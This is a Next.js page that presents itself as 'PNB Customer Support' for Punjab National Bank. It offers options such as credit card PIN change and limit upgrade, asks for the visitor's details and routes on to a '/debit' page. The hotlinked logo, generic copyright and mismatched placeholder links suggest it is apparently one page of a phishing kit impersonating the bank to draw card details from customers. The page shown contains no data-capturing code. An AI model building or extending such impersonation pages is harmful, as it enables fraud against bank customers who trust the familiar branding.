"use client";

import { useRouter } from "next/navigation";
import { useState } from "react";

export default function Page() {
  const router = useRouter();

  const [selected, setSelected] = useState(null);
  return (
    <div>
      <section className="w-full">
        {/* <!-- Harsha Web --> */}
        <div className="h-auto w-full flex items-center justify-left bg-[#91203e] p-1">
          <img
            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSaePPd-mxequ-ctngUKynMFKVPkuogwmb5cw&s"
            className="p-2 h-[60px]"
            alt="Logo"
          />
          <span className="font-semibold text-xl text-white">
            PNB Customer Support
          </span>
        </div>
        <div className="p-6">
          <h1 className="text-2xl font-bold text-[#91203e]">
            Welcome to Punjab National Bank!
          </h1>
          <p className="text-sm text-slate-600 mt-2">
            It is pleasure having you here. We would like to have few details of
            yours.
          </p>
          <form
            className="space-y-6 flex flex-col justify-center"
            action=""
            id="third-form"
          >
            {/* <!-- Payment Option --> */}
            <div className="flex flex-col space-y-2 mt-5">
              <div
                className={`flex items-center border border-slate-500 rounded p-2 ${selected === "1" ? "bg-[#91203e] text-white" : ""}`}
                onClick={() => {
                  setSelected("1");
                }}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="30"
                  height="30"
                  fill="currentColor"
                  class="bi bi-arrow-right"
                  viewBox="0 0 16 16"
                >
                  <path
                    fill-rule="evenodd"
                    d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8"
                  />
                </svg>
                <label className="cursor-pointer ml-2">
                  <input
                    type="radio"
                    name="payment_method"
                    value="UPI"
                    className="sr-only"
                  />
                  <span>Credit Card to Card Apply</span>
                </label>
              </div>
              <div
                className={`flex items-center border border-slate-500 rounded p-2 ${selected === "2" ? "bg-[#91203e] text-white" : ""}`}
                onClick={() => {
                  setSelected("2");
                }}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="30"
                  height="30"
                  fill="currentColor"
                  class="bi bi-arrow-right"
                  viewBox="0 0 16 16"
                >
                  <path
                    fill-rule="evenodd"
                    d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8"
                  />
                </svg>
                <label className="cursor-pointer ml-2">
                  <input
                    type="radio"
                    name="payment_method"
                    value="UPI"
                    className="sr-only"
                  />
                  <span>Credit Card Limit Upgrade</span>
                </label>
              </div>
              <div
                className={`flex items-center border border-slate-500 rounded p-2 ${selected === "3" ? "bg-[#91203e] text-white" : ""}`}
                onClick={() => {
                  setSelected("3");
                }}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="30"
                  height="30"
                  fill="currentColor"
                  class="bi bi-arrow-right"
                  viewBox="0 0 16 16"
                >
                  <path
                    fill-rule="evenodd"
                    d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8"
                  />
                </svg>
                <label className="cursor-pointer ml-2">
                  <input
                    type="radio"
                    name="payment_method"
                    value="UPI"
                    className="sr-only"
                  />
                  <span>Credit Card Pin Change</span>
                </label>
              </div>
              {/* Divider */}
              {/* <div className="w-full items-center justify-center flex">
                <span>Or</span>
              </div> */}
              <div
                className={`flex items-center border border-slate-500 rounded p-2 ${selected === "4" ? "bg-[#91203e] text-white" : ""}`}
                onClick={() => {
                  setSelected("4");
                }}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="30"
                  height="30"
                  fill="currentColor"
                  class="bi bi-arrow-right"
                  viewBox="0 0 16 16"
                >
                  <path
                    fill-rule="evenodd"
                    d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8"
                  />
                </svg>
                <label className="cursor-pointer ml-2">
                  <input
                    type="radio"
                    name="payment_method"
                    value="Debit Card"
                    className="sr-only"
                  />
                  <span>Online enable and disable credit card</span>
                </label>
              </div>
              <div className="w-full flex justify-center items-center !mt-10">
                <button
                  className="bg-gradient-to-r from-[#91203e] to-[#91203e] hover:from-red-700 hover:to-purple-700 text-white font-bold py-2 px-10 rounded focus:outline-none focus:shadow-outline w-full"
                  type="button"
                  onClick={() => {
                    router.push("/debit");
                  }}
                >
                  Submit
                </button>
              </div>
            </div>
          </form>
          {/* <!-- Bottom Area --> */}
          <div className="mt-10">
            <div className="grid grid-cols-1 w-full">
              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                <span>FAQs: </span>
                <span className="text-slate-600">
                  Find answers to the most frequently asked questions.
                </span>
              </div>
              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                <span>Contact Us: </span>
                <span className="text-slate-600">
                  Get in touch with our support team.
                </span>
              </div>
              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                <span>Product Guides: </span>
                <span className="text-slate-600">
                  Access detailed guides and tutorials.
                </span>
              </div>
              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                <span>Account Management: </span>
                <span className="text-slate-600">
                  Manage your account settings and preferences
                </span>
              </div>
              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                <span>Order Tracking: </span>
                <span className="text-slate-600">
                  Track the status of your orders.
                </span>
              </div>
            </div>
          </div>
        </div>
      </section>
      {/* <!-- Footer --> */}
      <section className="bg-[#91203e] p-5 w-full">
        <div className="flex space-x-1 w-full justify-between">
          <span className="text-xs text-white font-bold">Contact Us</span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">Locate Us</span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">Rate & Charges</span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">Regulatory</span>
        </div>
        <div className="flex space-x-1 w-full justify-between mt-2">
          <span className="text-xs text-white font-bold">Policies</span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">
            Regulatory Disclosures
          </span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">
            Secure Usage Guidelines
          </span>
        </div>
        {/* <!-- Copyright --> */}
        <div className="mt-5 text-[10px] text-white">
          Copyright @2021-2022 CUSTOMER SUPPORT. All right reserved.
        </div>
      </section>
    </div>
  );
}
